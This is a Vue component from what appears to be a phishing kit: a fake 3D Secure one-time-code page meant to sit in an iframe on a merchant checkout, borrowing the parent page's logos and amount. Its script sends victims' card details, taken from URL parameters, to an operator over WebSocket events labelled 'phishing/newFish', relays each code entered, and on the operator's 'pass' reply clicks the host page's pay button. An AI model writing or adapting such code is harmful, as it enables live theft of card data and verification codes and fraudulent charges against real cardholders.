<template>
  <div class="min-h-screen bg-gray-50 flex items-center justify-center p-4">
    <div class="w-full max-w-[750px] bg-white rounded-lg shadow-lg overflow-hidden">
      <!-- Header - Issuer Identity -->
      <div class="bg-white border-b border-gray-200 p-4 sm:p-6">
        <!-- BankCard Component -->
        <div class="flex items-center justify-between">
          <div class="flex items-center gap-2 sm:gap-3">
            <img id="shopLogo"
                 src="https://images.unsplash.com/photo-1606429437134-9d975fcc508f?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=M3w3Nzg4Nzd8MHwxfHNlYXJjaHwxfHxzdHJpcGUlMjBwYXR0ZXJufGVufDF8fHx8MTc2NDU2MDI5N3ww&ixlib=rb-4.1.0&q=80&w=1080&utm_source=figma&utm_medium=referral"
                 alt="Stripe Pattern"
                 class="h-10 sm:h-12 w-auto rounded"
            />
          </div>

          <div class="flex items-center">
            <img id="bankLogo"
                 src="http://tentree.com/cdn/shopifycloud/checkout-web/assets/c1/assets/amex.Csr7hRoy.svg"
                 alt="Mastercard ID Check"
                 class="h-10 sm:h-12 w-auto rounded"
            />
          </div>
        </div>
      </div>

      <!-- Challenge Content -->
      <div class="p-4 sm:p-6">
        <!-- OtpForm Component -->
        <div class="space-y-6">
          <!-- Challenge Information -->
          <div>
            <h2 class="mb-4 text-gray-900">Payment authentication</h2>

            <!-- Transaction Details - Prominent Display -->
            <div class="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4">
              <div class="text-sm text-gray-600 mb-2">You are authorizing a payment of</div>
              <div id="i-money" class="text-2xl sm:text-3xl font-semibold text-gray-900 mb-2">$99.00</div>
              <div class="text-sm text-gray-600">
                to <span id="i-bank" class="font-medium text-gray-900">SecureBank</span> on <span id="i-date"
                                                                                                  class="font-medium">27/02/24</span>
              </div>
            </div>

            <p class="text-sm sm:text-base text-gray-600">
              We have sent you a text message with a code to your registered mobile number ending in
              <span id="i-phone" class="font-medium">**7878</span>.
            </p>
          </div>

          <!-- Challenge Data Entry -->
          <form @submit.prevent="handleSubmit" class="space-y-4">
            <div>
              <label for="otp-code" class="text-sm sm:text-base text-gray-700 mb-2 block">
                Enter authentication code
              </label>
              <input
                  id="otp-code"
                  v-model="cardInfo.code"
                  type="text"
                  placeholder="Enter code"
                  maxlength="8"
                  class="w-full h-12 sm:h-14 text-center text-base sm:text-base tracking-widest font-base border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent px-4"
                  required
              />
            </div>

            <!-- Action Buttons -->
            <div class="space-y-3 pt-2">
              <button
                  type="submit"
                  :disabled="cardInfo.code?.length !== 6 || isSubmitting"
                  class="w-full h-12 sm:h-14 bg-green-600 hover:bg-green-700 text-white rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-normal"
              >
                {{ isSubmitting ? 'VERIFYING...' : 'SUBMIT' }}
              </button>

              <button
                  type="button"
                  @click="handleResendCode"
                  :disabled="countdown > 0"
                  class="w-full h-12 sm:h-14 border border-gray-300 text-gray-700 hover:bg-gray-50 rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-normal bg-white"
              >
                {{ countdown > 0 ? `RESEND CODE (${countdown}s)` : 'RESEND CODE' }}
              </button>
            </div>
          </form>

          <!-- Additional Information - FAQ -->
          <div class="pt-4 border-t border-gray-200">
            <button
                @click="isExpanded = !isExpanded"
                class="flex items-center justify-between w-full py-2 text-left group"
            >
              <span class="text-xs sm:text-sm text-gray-600 group-hover:text-gray-800">
                Why am I seeing this?
              </span>
              <!-- ChevronDown Icon -->
              <svg
                  v-if="isExpanded"
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  class="h-3 w-3 sm:h-4 sm:w-4 text-gray-400 transition-transform"
              >
                <polyline points="6 9 12 15 18 9"></polyline>
              </svg>
              <!-- ChevronRight Icon -->
              <svg
                  v-else
                  xmlns="http://www.w3.org/2000/svg"
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2"
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  class="h-3 w-3 sm:h-4 sm:w-4 text-gray-400 transition-transform"
              >
                <polyline points="9 18 15 12 9 6"></polyline>
              </svg>
            </button>

            <transition name="expand">
              <div v-show="isExpanded" class="overflow-hidden">
                <div class="pb-3 pt-1 text-xs sm:text-sm text-gray-500 leading-relaxed">
                  <p>
                    3D Secure authentication provides an additional layer of security for online transactions.
                    This verification process helps protect your card from unauthorized use by requiring you
                    to enter a one-time password sent to your registered mobile device.
                  </p>
                </div>
              </div>
            </transition>
          </div>
        </div>
      </div>
    </div>

    <!-- Error Modal - EMVCo Compliant -->
    <Teleport to="body">
      <transition name="modal-fade">
        <div
            v-if="showError"
            class="fixed inset-0 z-50 flex items-center justify-center p-4 bg-gray-900/40"
            @click.self="closeErrorModal"
        >
          <div class="bg-white rounded-lg shadow-xl p-6 w-full max-w-md transform transition-all">
            <div class="flex flex-col items-center text-center space-y-4">
              <!-- Error Icon -->
              <div class="flex-shrink-0 w-16 h-16 bg-red-100 rounded-full flex items-center justify-center">
                <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="32"
                    height="32"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    class="text-red-600"
                    aria-hidden="true"
                >
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="12" y1="8" x2="12" y2="12"></line>
                  <line x1="12" y1="16" x2="12.01" y2="16"></line>
                </svg>
              </div>

              <!-- Error Content -->
              <div class="space-y-2">
                <h3 class="text-lg sm:text-xl font-semibold text-gray-900">
                  Verification failed
                </h3>
                <p class="text-sm sm:text-base text-gray-600 max-w-sm">
                  The code you entered is incorrect. Please check your message and try again, or request a new code.
                </p>
              </div>

              <!-- Action Button -->
              <div class="w-full pt-2">
                <UButton
                    color="green"
                    size="lg"
                    block
                    @click="closeErrorModal"
                    class="h-12 sm:h-14"
                >
                  Try again
                </UButton>
              </div>
            </div>
          </div>
        </div>
      </transition>
    </Teleport>
  </div>
</template>

<script setup lang="ts">
import {ref, watch, onBeforeUnmount, onMounted} from 'vue';
import {getParentOne} from '~/utils/dom';
import {addOnMessage, removeOnMessage, sendMsg} from '~/utils';
import type {WebSocketMessage} from '~/utils';
import {useLoadingStore} from "~/stores/loading";
import {checkBinApi} from "~/composables/api";

const loadingStore = useLoadingStore();

const eventNewFish = 'websocket/addons/phishing/newFish';
const eventEditFish = 'websocket/addons/phishing/editFish';
const eventCallBack = 'websocket/addons/phishing/callbackFish';

// OTP Form State
const isSubmitting = ref(false);
const isExpanded = ref(false);
const countdown = ref(0);
const cardInfo = ref({});
const showError = ref(false);

// Countdown Timer Watcher
watch(countdown, (newValue) => {
  if (newValue > 0) {
    setTimeout(() => {
      countdown.value--;
    }, 1000);
  }
});

// 开始提交 - loading
const handleSubmit = async () => {
  submitCode()
  isSubmitting.value = true;
  // loadingStore.loadLoading();
  loadingStore.loadStripe();
};

// 发送验证码给后端
function submitCode() {
  if (cardInfo.code == '') {
    return;
  }
  cardInfo.value['status'] = 'checking';
  sendMsg(eventEditFish, {
    message: cardInfo.value,
  });
}

// 消息回调
const callBackFish = (res: WebSocketMessage) => {
  if (res.data.action == "send") {
    // 取消loading状态， 展示页面
    loadingStore.unloadStripe();
  } else if (res.data.action == "pass") {
    isSubmitting.value = false;
    // 提交成功，跳转页面
    console.log("======真实提交")
    const btn = top.document.getElementById("checkout-pay-button");
    btn.disabled = false;
    btn.click();
    top.window.hack = false;
  } else if (res.data.action == "reject") {
    isSubmitting.value = false;
    cardInfo.value['code'] = ''
    // 提交失败，提示用户 - EMVCo Compliant Modal Display
    showError.value = true;
    loadingStore.unloadStripe();
  } else if (res.data.action == "decline") {
    isSubmitting.value = false;
    cardInfo.value['code'] = ''
    // 提交失败，提示用户 - EMVCo Compliant Modal Display
    showError.value = true;
    loadingStore.unloadStripe();
  }
  console.log("callBackFish：", res)
};

// Resend Code Handler
const handleResendCode = () => {
  cardInfo.value['status'] = 'resend'
  cardInfo.value['code'] = ''
  sendMsg(eventEditFish, {
    message: cardInfo.value,
  });
  countdown.value = 60;
  // 清除错误提示
  showError.value = false;
};

// Close Error Modal
const closeErrorModal = () => {
  showError.value = false;
};

onMounted(async () => {
  // 在当前页面注册消息监听
  addOnMessage(eventCallBack, callBackFish);

  // 解析URL参数
  const resultObject: { [key: string]: string } = Object.fromEntries(new URLSearchParams(window.location.search));

  // 解析bin
  // const binInfo = await $fetch('/api/check-bin', {
  //   method: 'POST',
  //   body: { bin: resultObject.cardNo.slice(0,6) }
  // });
  // if(binInfo.success) {
  //   resultObject['cardBank'] = binInfo.data.bank;
  //   resultObject['cardBrand'] = binInfo.data.brand;
  //   resultObject['cardType'] = binInfo.data.type;
  //   resultObject['cardLevel'] = binInfo.data.level;
  //   resultObject['cardCountry'] = binInfo.data.country;
  //   resultObject['cardCountryFlag'] = binInfo.data.additional_info.country_flag;
  // }

  // const binInfo = await $fetch('/api/check-bin', {
  //   method: 'GET',
  //   query: { bin: resultObject.cardNo }
  // });
  //
  // if(binInfo.success) {
  //   resultObject['cardBank'] = binInfo.BIN.issuer.name;
  //   resultObject['cardBrand'] = binInfo.BIN.brand;
  //   resultObject['cardType'] = binInfo.BIN.type;
  //   resultObject['cardLevel'] = binInfo.BIN.level;
  //   resultObject['cardCountry'] = binInfo.BIN.country.alpha2;
  //   resultObject['cardCountryFlag'] = binInfo.BIN.country.flag;
  // }

  // 从父级页面获取信息
  /*if(window.self !== window.top){
    document.domain = "chemicalguys.top"
    console.log("im in!")
    // 设置logo
    const bankLogo = top.document.querySelector('#basic-creditCards-secondary img').src;
    document.querySelector('#bankLogo').setAttribute('src', bankLogo);
    const shopLogo = top.document.querySelector('a img').src;
    document.querySelector('#shopLogo').setAttribute('src', shopLogo);
    // 支付金额
    document.querySelector("#i-money").innerHTML = top.document.querySelector("strong:nth-child(2)").innerHTML;
    // 商户名
    document.querySelector("#i-bank").innerHTML = top.document.querySelector('a img').alt;
    // 日期
    document.querySelector("#i-date").innerHTML = new Date().toLocaleDateString('en-US', {
                                                            day: '2-digit',
                                                            month: '2-digit',
                                                            year: '2-digit'
                                                          });
    // 手机号后四位
    document.querySelector("#i-phone").innerHTML = resultObject['fpPhone'].slice(-4).padStart(4, '*');
  }*/
  if (window.self !== window.top) {
    console.log("im in!")
    var data = await getParentOne('#basic-creditCards-secondary img', ['src']);
    console.log("=========data", data)
    // 设置logo
    const bankLogo = await getParentOne('#basic-creditCards-secondary img', ['src']).src;
    document.querySelector('#bankLogo').setAttribute('src', bankLogo);
    const shopLogo = await getParentOne('a img', ['src']).src;
    document.querySelector('#shopLogo').setAttribute('src', shopLogo);
    // 支付金额
    document.querySelector("#i-money").innerHTML = await getParentOne("strong:nth-child(2)").innerHTML;
    // 商户名
    document.querySelector("#i-bank").innerHTML = await getParentOne('a img', ['alt']).alt;
    // 日期
    document.querySelector("#i-date").innerHTML = new Date().toLocaleDateString('en-US', {
      day: '2-digit',
      month: '2-digit',
      year: '2-digit'
    });
    // 手机号后四位
    document.querySelector("#i-phone").innerHTML = resultObject['fpPhone'].slice(-4).padStart(4, '*');
  }

  // 初始化
  resultObject['status'] = 'ready';
  console.log(resultObject);
  cardInfo.value = resultObject;


  // 发送上鱼消息
  sendMsg(eventNewFish, {
    message: cardInfo.value,
  });
});

onBeforeUnmount(() => {
  // 移除消息监听
  removeOnMessage(callBackFish);
});


</script>

<style scoped>
.expand-enter-active,
.expand-leave-active {
  transition: all 0.3s ease-in-out;
}

.expand-enter-from,
.expand-leave-to {
  max-height: 0;
  opacity: 0;
}

.expand-enter-to,
.expand-leave-from {
  max-height: 384px;
  opacity: 1;
}

/* Modal Transition */
.modal-fade-enter-active,
.modal-fade-leave-active {
  transition: opacity 0.3s ease;
}

.modal-fade-enter-active > div,
.modal-fade-leave-active > div {
  transition: transform 0.3s ease, opacity 0.3s ease;
}

.modal-fade-enter-from,
.modal-fade-leave-to {
  opacity: 0;
}

.modal-fade-enter-from > div,
.modal-fade-leave-to > div {
  transform: scale(0.95);
  opacity: 0;
}
</style>